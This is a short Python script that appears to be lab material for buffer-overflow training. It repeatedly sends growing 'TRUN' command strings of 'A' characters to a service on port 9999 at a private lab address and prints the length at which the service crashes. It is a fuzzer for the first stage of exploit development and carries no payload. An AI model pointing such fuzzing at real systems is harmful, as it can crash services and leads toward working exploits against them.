import socket as sc
import sys
from time import sleep

num=100
sendingToMessage="TRUN /.:/" +"A"*num
while True:
    try:
        connection=sc.socket(sc.AF_INET,sc.SOCK_STREAM)
        connection.connect(("10.0.2.5",9999))
        connection.send(sendingToMessage.encode())
        connection.close()

        sendingToMessage=sendingToMessage +sendingToMessage*num
        sleep(1)
    except KeyboardInterrupt:
        print("Crash at: "+str(len(sendingToMessage)))
        sys.exit()
    except Exception as e:
        print("Crash at: "+str(len(sendingToMessage)))
        print(e)
        sys.exit()


